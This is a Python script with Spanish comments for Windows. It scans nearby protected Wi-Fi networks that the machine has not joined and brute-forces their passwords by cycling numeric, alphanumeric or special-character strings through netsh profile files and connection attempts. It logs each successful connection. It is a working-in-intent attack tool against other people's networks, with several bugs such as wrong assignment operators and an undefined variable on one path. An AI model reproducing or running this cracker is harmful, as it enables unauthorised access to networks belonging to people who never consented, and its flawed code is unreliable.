from tqdm import tqdm
import os, re, subprocess, pandas as pd, numpy as np

def Find_SSID(dim):
    # ver redes detectables y caracteristicas
    wifi_info = str(subprocess.run(["netsh","wlan","show","networks"], capture_output=True))
    wifi_prev= str(subprocess.run(["netsh","wlan","show","profiles"], capture_output=True) )

    # Analizadores de texto
    Rex_ssid=re.compile(r"SSID [\d]+ : ([\w \d \s \- \.]*)")
    Rex_se=re.compile(r"Autenticaci\\xa2n           : ([\w \d \s \- \.]*)")
    Rex_prev=re.compile(r"Perfil de todos los usuarios     : ([\w \d \s \- \.]*)")

    # hacer DB de las redes y tipo
    SSID=Rex_ssid.findall(wifi_info)
    tipo=Rex_se.findall(wifi_info)
    conocidas=Rex_prev.findall(wifi_prev)
    redes= pd.DataFrame({"Redes":SSID,"Seguridad":tipo,"last":np.zeros(len(SSID))})

    # depurar redes compatibles
    indexN=redes[redes["Seguridad"]=="Abierta"].index
    redes.drop(indexN,inplace=True)
    indexN=redes[redes["Redes"]==""].index
    redes.drop(indexN,inplace=True)
    for i in range(len(conocidas)):
        indexN=redes[redes["Redes"]==conocidas[i]].index
        redes.drop(indexN,inplace=True)
    redes.reset_index(drop=True,inplace=True)
    # Cambiar el nombre de seguridad a su valor equivalente #
    redes.Seguridad=redes.Seguridad.replace(["WPA2-Personal","WPA-Personal"],["WPA2PSK","WPAPSK"])
    # cargar columna de ultimo valor probado #

    ## cargar formato xml para las redes disponibles ##
    xml=open(".\\Sample.xml").readlines()
    for i in range(len(redes.Redes)):
        if os.path.exists(".\\temp\\"+redes.Redes[i]+".xml")==False:
            xml[2]="\t<name>"+ redes.Redes[i] +"</name>\n"
            xml[5]="\t\t\t<hex>"+ (redes.Redes[i].encode("utf-8")).hex() +"</hex>\n"
            xml[6]="\t\t\t<name>"+ redes.Redes[i] +"</name>\n"
            xml[14]="\t\t\t\t<authentication>"+ redes.Seguridad[i] +"</authentication>\n"
            if redes.Seguridad[i]=="WPA2PSK":
                xml[15]="\t\t\t\t<encryption>AES</encryption>\n"
            elif redes.Seguridad[i]=="WPAPSK":
                xml[15]="\t\t\t\t<encryption>AES</encryption>\n"
            temp=open(".\\temp\\"+redes.Redes[i]+".xml","w")
            temp.write("".join(xml))
            temp.close()
        else: ##PROBAR si puedo generar una columna de boolenaos ##
            Rex_last=re.compile(r"\t\t\t\t<keyMaterial>([\w \d \s \- \.]*)</keyMaterial>\n")
            last=Rex_last.search(xml[21])
            # verificar que sean de igual dimension si no descartar cambio
            if last!=None:
                if len(last[0])==dim:
                    redes.last[i]==last[0]

    return redes

# incrementador de cadenas
def incress(pws,caracts):
    for i in range(len(pws)-1,-1,-1):
        if pws[i]!=caracts[-1]:
            for n in range(len(pws)-1,i,-1):
                pws[n]=caracts[0]
            pws[i]=caracts[caracts.index(pws[i])+1]
            inc=True
            return pws, inc
    #ultimo valor posible
    if i=="0":
        inc=False
        return pws,inc

## terminar el key_test para probar el 
def key_test(pw,red):
    temp=open(".\\temp\\"+red+".xml","r")
    xml=temp.readlines()
    temp.close()    
    ## abrir un xml y pasarle los parametros de pw y red y cambiar el pw protected a false
    xml[21]="\t\t\t\t<keyMaterial>"+ pw +"</keyMaterial>\n"
    temp=open(".\\temp\\"+red+".xml","w")
    temp.write("".join(xml))
    temp.close()
    ## añadir la red a probar ## 
    subprocess.run(["netsh","wlan","add","profile","filename=.\\temp\\"+ red +".xml"])        
    # prueba de clave
    connection=str(subprocess.run(["netsh","wlan","connect","name="+red], capture_output=True))
    Rex_connect=re.compile(r"(La solicitud de conexi\\xa2n se complet\\xa2 correctamente\.)")
    cover=Rex_connect.search(connection)
    if cover!=None:
        # informacion de conexion
        interface=str(subprocess.run(["netsh","wlan","show","interface"], capture_output=True))
        # analizar texto de salida conexion correcta
        Rex_interface=re.compile(r"Estado                 : conectado")
        eval=Rex_interface.search(interface)
        if  eval==None:
            return False        
        else:
            temp=open(".\\temp\\"+red+".txt","wb")
            temp.write(interface)
            temp.close()
            return True
    else:
        return None
        
def numeric(redes,last,dim):
    keys=0
    for i in tqdm(range(last)):
        pw="0"*(dim-(len(str(i))))+str(i)
        # probar en redes
        for k in range(len(redes.Redes)):
                signal=key_test(pw,redes.Redes[k])
                if signal==True:
                    redes.drop(k,inplace=True)
                    redes.reset_index(drop=True,inplace=True)
                    print("\nSe ha conseguido una key c:\n")
                    keys=+1

    for n in range(redes.Redes):
        subprocess.run(["netsh","wlan","delete","profile name="+redes.Redes[n]])
    
    return keys

def alfanum(redes,dim,ntries):
    import string
    # condicion de alfanumerico o con caracteres especiales
    if ntries==0:
        t="alfanumerico"
        caracts=list(string.digits+string.ascii_letters)
    elif ntries==1:
        t="caracteres especiales"
        caracts=list(string.digits+string.ascii_letters+string.punctuation)
    pws=[]
    # dimensiona la cadena a generar
    for i in range(dim):
        pws.append("0")    
    inc=True
    while inc==True and len(redes.Redes)>0:
        keys=0
        for i in range(len(caracts)):
            pws[-1]=caracts[i]
            pw="".join(pws)
            ## Enviar a la funcion de test ##
            for k in range(len(redes.Redes)):
                ## conseguir como evaluar las cadenas inferiores a otras para descartar repetidos ##
                if redes.last[i]==pw:
                    redes.last[i]==True
                signal=key_test(pw,redes.Redes[k])
                if signal==True:
                    redes.drop(k,inplace=True)
                    redes.reset_index(drop=True,inplace=True)
                    keys=+1
        pws,inc=incress(pws,caracts)
    for n in range(len(redes.Redes)):
        subprocess.run(["netsh","wlan","delete","profile name="+redes.Redes[n]])
    return f"test de tipo: {t} y de cadenas de: {str(dim)} fue completado",keys

## primeros test funcionaron pero la iteracion tiene mucho coste computacional ##
while True:
    try:
        dim = int(input('Dimension de la clave a probar'))
    except:
        print('no es un valor numerico')

    # dimension de la clave a probar
    type = input('tipo de cadena (num/alfaNum/alfaEspecial)')
    # Ver redes e iniciar los archivos xml
    redes=Find_SSID(dim)
    last=int("1"+"0"*dim)

    # numericas
    if type == 'num':
        keys=numeric(redes,last,dim)
        break
    # alfanumericas
    elif type == 'alfaNum':
        log,keys = alfanum(redes,dim,0)
        break
    # alfanumericas con caracteres especiales
    elif type == 'alfaEspecial':
        log,keys=alfanum(redes,dim,1)
        break
    else:
        print('No has introducido un tipo valido')

print(log)
print(f"keys encontradas: {keys}")